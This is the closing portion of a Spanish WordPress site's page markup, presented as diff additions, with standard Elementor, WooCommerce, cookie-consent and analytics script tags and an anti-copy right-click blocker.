+				-webkit-user-select: none;
+				-webkit-touch-callout: none;
+				-ms-user-select: none;
+				-moz-user-select: none;
+				user-select: none;
+			}
+		</style>
+		<script type="text/javascript">
+			/*<![CDATA[*/
+			document.oncontextmenu = function(event) {
+				if (event.target.tagName != 'INPUT' && event.target.tagName != 'TEXTAREA') {
+					event.preventDefault();
+				}
+			};
+			document.ondragstart = function() {
+				if (event.target.tagName != 'INPUT' && event.target.tagName != 'TEXTAREA') {
+					event.preventDefault();
+				}
+			};
+			/*]]>*/
+		</script>
+					<script>
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
+				<script>
+		(function () {
+			var c = document.body.className;
+			c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
+			document.body.className = c;
+		})();
+	</script>
+	<link rel='stylesheet' id='wc-stripe-blocks-checkout-style-css' href='https://www.innovagogia.es/wp-content/plugins/woocommerce-gateway-stripe/build/upe-blocks.css?ver=7a015a6f0fabd17529b6' media='all' />
+<link rel='stylesheet' id='wc-blocks-style-css' href='https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/client/blocks/wc-blocks.css?ver=wc-10.3.7' media='all' />
+<script src="https://www.innovagogia.es/wp-content/themes/hello-elementor/assets/js/hello-frontend.js?ver=3.4.5" id="hello-theme-frontend-js"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.31.5" id="elementor-webpack-runtime-js"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.31.5" id="elementor-frontend-modules-js"></script>
+<script src="https://www.innovagogia.es/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script id="elementor-frontend-js-before">
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Compartir en Facebook","shareOnTwitter":"Compartir en Twitter","pinIt":"Pinear","download":"Descargar","downloadImage":"Descargar imagen","fullscreen":"Pantalla completa","zoom":"Zoom","share":"Compartir","playVideo":"Reproducir v\u00eddeo","previous":"Anterior","next":"Siguiente","close":"Cerrar","a11yCarouselPrevSlideMessage":"Diapositiva anterior","a11yCarouselNextSlideMessage":"Diapositiva siguiente","a11yCarouselFirstSlideMessage":"Esta es la primera diapositiva","a11yCarouselLastSlideMessage":"Esta es la \u00faltima diapositiva","a11yCarouselPaginationBulletMessage":"Ir a la diapositiva"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"M\u00f3vil vertical","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"M\u00f3vil horizontal","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tableta vertical","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tableta horizontal","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Port\u00e1til","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Pantalla grande","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.31.5","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"nested-elements":true,"e_element_cache":true,"home_screen":true,"global_classes_should_enforce_capabilities":true,"e_variables":true,"cloud-library":true,"e_opt_in_v4_page":true,"e_pro_variables":true},"urls":{"assets":"https:\/\/www.innovagogia.es\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/www.innovagogia.es\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/www.innovagogia.es\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"8e46bdee17"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","woocommerce_notices_elements":[],"hello_header_logo_type":"title","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":742,"title":"Publicaciones%20-%20Innovagog%C3%ADa","excerpt":"","featuredImage":false}};
+</script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.31.5" id="elementor-frontend-js"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/lib/smartmenus/jquery.smartmenus.min.js?ver=1.2.1" id="smartmenus-js"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/lib/sticky/jquery.sticky.min.js?ver=3.32.0" id="e-sticky-js"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor/assets/lib/swiper/v8/swiper.min.js?ver=8.4.5" id="swiper-js"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/js/sourcebuster/sourcebuster.min.js?ver=10.3.7" id="sourcebuster-js-js"></script>
+<script id="wc-order-attribution-js-extra">
+var wc_order_attribution = {"params":{"lifetime":1.0e-5,"session":30,"base64":false,"ajaxurl":"https:\/\/www.innovagogia.es\/wp-admin\/admin-ajax.php","prefix":"wc_order_attribution_","allowTracking":true},"fields":{"source_type":"current.typ","referrer":"current_add.rf","utm_campaign":"current.cmp","utm_source":"current.src","utm_medium":"current.mdm","utm_content":"current.cnt","utm_id":"current.id","utm_term":"current.trm","utm_source_platform":"current.plt","utm_creative_format":"current.fmt","utm_marketing_tactic":"current.tct","session_entry":"current_add.ep","session_start_time":"current_add.fd","session_pages":"session.pgs","session_count":"udata.vst","user_agent":"udata.uag"}};
+</script>
+<script src="https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/js/frontend/order-attribution.min.js?ver=10.3.7" id="wc-order-attribution-js"></script>
+<script id="cmplz-cookiebanner-js-extra">
+var complianz = {"prefix":"cmplz_","user_banner_id":"1","set_cookies":[],"block_ajax_content":"","banner_version":"19","version":"7.4.4.2","store_consent":"","do_not_track_enabled":"","consenttype":"optin","region":"eu","geoip":"","dismiss_timeout":"","disable_cookiebanner":"","soft_cookiewall":"","dismiss_on_scroll":"","cookie_expiry":"365","url":"https:\/\/www.innovagogia.es\/wp-json\/complianz\/v1\/","locale":"lang=es&locale=es_ES","set_cookies_on_root":"","cookie_domain":"","current_policy_id":"34","cookie_path":"\/","categories":{"statistics":"estad\u00edsticas","marketing":"m\u00e1rketing"},"tcf_active":"","placeholdertext":"Haz clic para aceptar cookies de marketing y permitir este contenido","css_file":"https:\/\/www.innovagogia.es\/wp-content\/uploads\/complianz\/css\/banner-{banner_id}-{type}.css?v=19","page_links":{"eu":{"cookie-statement":{"title":"Pol\u00edtica de cookies","url":"https:\/\/www.innovagogia.es\/politica-de-cookies\/"},"privacy-statement":{"title":"Declaraci\u00f3n de privacidad","url":"https:\/\/www.innovagogia.es\/politica-de-privacidad\/"},"impressum":{"title":"Impressum","url":"https:\/\/www.innovagogia.es\/aviso-legal\/"}},"us":{"impressum":{"title":"Impressum","url":"https:\/\/www.innovagogia.es\/aviso-legal\/"}},"uk":{"impressum":{"title":"Impressum","url":"https:\/\/www.innovagogia.es\/aviso-legal\/"}},"ca":{"impressum":{"title":"Impressum","url":"https:\/\/www.innovagogia.es\/aviso-legal\/"}},"au":{"impressum":{"title":"Impressum","url":"https:\/\/www.innovagogia.es\/aviso-legal\/"}},"za":{"impressum":{"title":"Impressum","url":"https:\/\/www.innovagogia.es\/aviso-legal\/"}},"br":{"impressum":{"title":"Impressum","url":"https:\/\/www.innovagogia.es\/aviso-legal\/"}}},"tm_categories":"","forceEnableStats":"","preview":"","clean_cookies":"","aria_label":"Haz clic para aceptar cookies de marketing y permitir este contenido"};
+</script>
+<script defer src="https://www.innovagogia.es/wp-content/plugins/complianz-gdpr/cookiebanner/js/complianz.min.js?ver=1765958681" id="cmplz-cookiebanner-js"></script>
+<script id="cmplz-cookiebanner-js-after">
+		if ('undefined' != typeof window.jQuery) {
+			jQuery(document).ready(function ($) {
+				$(document).on('elementor/popup/show', () => {
+					let rev_cats = cmplz_categories.reverse();
+					for (let key in rev_cats) {
+						if (rev_cats.hasOwnProperty(key)) {
+							let category = cmplz_categories[key];
+							if (cmplz_has_consent(category)) {
+								document.querySelectorAll('[data-category="' + category + '"]').forEach(obj => {
+									cmplz_remove_placeholder(obj);
+								});
+							}
+						}
+					}
+
+					let services = cmplz_get_services_on_page();
+					for (let key in services) {
+						if (services.hasOwnProperty(key)) {
+							let service = services[key].service;
+							let category = services[key].category;
+							if (cmplz_has_service_consent(service, category)) {
+								document.querySelectorAll('[data-service="' + service + '"]').forEach(obj => {
+									cmplz_remove_placeholder(obj);
+								});
+							}
+						}
+					}
+				});
+			});
+		}
+</script>
+<script id="wc-cart-fragments-js-extra">
+var wc_cart_fragments_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","cart_hash_key":"wc_cart_hash_73548584a161a53845287f55c3fc1a94","fragment_name":"wc_fragments_73548584a161a53845287f55c3fc1a94","request_timeout":"5000"};
+</script>
+<script src="https://www.innovagogia.es/wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=10.3.7" id="wc-cart-fragments-js" defer data-wp-strategy="defer"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=3.32.0" id="elementor-pro-webpack-runtime-js"></script>
+<script src="https://www.innovagogia.es/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
+<script src="https://www.innovagogia.es/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
+<script id="wp-i18n-js-after">
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+</script>
+<script id="elementor-pro-frontend-js-before">
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/www.innovagogia.es\/wp-admin\/admin-ajax.php","nonce":"bbea08d11e","urls":{"assets":"https:\/\/www.innovagogia.es\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/www.innovagogia.es\/wp-json\/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":false},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},"woocommerce":{"menu_cart":{"cart_page_url":"https:\/\/www.innovagogia.es\/carrito\/","checkout_page_url":"https:\/\/www.innovagogia.es\/finalizar-compra\/","fragments_nonce":"1c8367aa79"}},"facebook_sdk":{"lang":"es_ES","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/www.innovagogia.es\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
+</script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.32.0" id="elementor-pro-frontend-js"></script>
+<script src="https://www.innovagogia.es/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.32.0" id="pro-elements-handlers-js"></script>
+<!-- Statistics script Complianz GDPR/CCPA -->
+						<script type="text/plain"							data-category="statistics">window['gtag_enable_tcf_support'] = false;
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', '', {
+	cookie_flags:'secure;samesite=none',
+	
+});
+</script>
+</body>
+</html>
+
+
+<!-- Page cached by LiteSpeed Cache 7.7 on 2026-01-09 07:57:19 -->
